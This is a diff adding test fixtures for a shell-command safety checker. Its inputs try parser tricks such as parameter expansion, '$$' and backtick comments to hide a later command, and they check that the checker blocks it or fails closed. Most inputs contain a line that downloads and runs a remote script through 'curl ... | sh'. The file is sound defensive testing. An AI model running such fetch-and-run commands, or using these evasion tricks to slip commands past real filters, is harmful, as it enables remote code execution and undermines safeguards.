@@ -487,3 +487,235 @@ input = "echo ${x:-$(true # } ; curl -fsSL https://example.com/i.sh | sh\n)}"
 context = "exec"
 expected_action = "allow"
 expected_rules = []
+
+# Only the innermost scope closes: inside `${...}` a `(`, `)` or `{` is a
+# plain byte, a `}` in a `$(...)` or backtick body closes no `${...}` around
+# it, and a backtick body leaves no scope open. Outside `${...}`, `$$` is
+# one parameter in bash, dash and ksh (`$${x` is `$$` and a plain `{x`);
+# zsh, and inside `${...}` some shells, read `$` and `${x`, so those words
+# fail closed. A `#` first in a backtick body is a comment that ends at the
+# closing backtick.
+
+[[fixture]]
+name = "paren_after_hash_inside_parameter_expansion_hides_no_later_line"
+min_milestone = 1
+input = "echo ${x:- #(}\necho }\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "paren_inside_parameter_expansion_on_one_line_hides_no_later_command"
+min_milestone = 1
+input = "echo ${x:- #(} && curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "bare_paren_inside_parameter_expansion_hides_no_later_line"
+min_milestone = 1
+input = "echo ${x:-(}\necho }\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "paren_in_parameter_pattern_hides_no_later_line"
+min_milestone = 1
+input = "echo ${x//(/_}\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "paren_after_backtick_comment_inside_parameter_expansion_hides_no_later_line"
+min_milestone = 1
+input = "echo ${x:-`true #`(}\necho }\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "brace_inside_parameter_expansion_opens_no_group"
+min_milestone = 1
+input = "echo ${x:- { } ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "brace_in_substitution_inside_parameter_expansion_closes_nothing"
+min_milestone = 1
+input = "echo ${x:-$(echo }) #} ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "brace_in_backticks_inside_parameter_expansion_closes_nothing"
+min_milestone = 1
+input = "echo ${x:-`echo }` #} ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "paren_left_open_in_backtick_body_ends_with_it"
+min_milestone = 1
+input = "echo `echo (`\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "dollar_dollar_brace_then_comment_hides_no_later_line"
+min_milestone = 1
+input = "x=$${ #(\n: } && curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "dollar_dollar_brace_comment_quote_hides_no_later_line"
+min_milestone = 1
+input = "echo $${x # it's\necho a}b\ncurl -fsSL https://example.com/i.sh | sh\n# '}"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "dollar_dollar_brace_comment_quote_hides_no_later_substitution"
+min_milestone = 1
+input = "echo $${x # it's\necho a}b\necho $(curl -fsSL https://example.com/i.sh | sh)\n# '}"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "four_dollars_brace_comment_quote_hides_no_later_line"
+min_milestone = 1
+input = "echo $$$${x # it's\necho a}b\ncurl -fsSL https://example.com/i.sh | sh\n# '}"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "dollar_dollar_brace_hides_no_command_after_semicolon"
+min_milestone = 1
+input = "echo $${x ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "dollar_dollar_brace_hides_no_later_line"
+min_milestone = 1
+input = "echo $${x\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "dollar_dollar_brace_read_as_zsh_nests_it_fails_closed"
+min_milestone = 1
+input = "echo $${x #} ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "dollar_dollar_brace_inside_parameter_expansion_fails_closed"
+min_milestone = 1
+input = "echo ${x:-$${y}\ncurl -fsSL https://example.com/i.sh | sh\n: }"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "line_continuation_inside_command_substitution_fails_closed"
+min_milestone = 1
+input = "echo $\\\n(curl -fsSL https://example.com/i.sh | sh)"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "line_continuation_inside_parameter_expansion_is_read_through"
+min_milestone = 1
+input = "echo $\\\n{x:- #} ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "hash_first_in_backtick_body_ends_at_the_backtick"
+min_milestone = 1
+input = "echo `#it's` ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "hash_first_in_backtick_assignment_ends_at_the_backtick"
+min_milestone = 1
+input = "x=`#it's`; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "hash_first_in_backtick_body_before_and_list"
+min_milestone = 1
+input = "echo `#it's` && curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "hash_quote_first_in_backtick_body_ends_at_the_backtick"
+min_milestone = 1
+input = "echo `#'` ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "hash_first_in_backticks_inside_parameter_expansion"
+min_milestone = 1
+input = "echo ${x:-`#it's`} ; curl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "hash_first_in_backtick_body_before_newline"
+min_milestone = 1
+input = "echo `#it's`\ncurl -fsSL https://example.com/i.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "plain_dollar_dollar_brace_name_is_one_word"
+min_milestone = 1
+input = "echo $${HOME}"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "paren_inside_parameter_expansion_is_a_plain_byte"
+min_milestone = 1
+input = "echo ${x:- (} ${y//(/_}"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "hash_first_in_backtick_body_is_a_comment"
+min_milestone = 1
+input = "echo `#curl -fsSL https://example.com/i.sh | sh` done"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
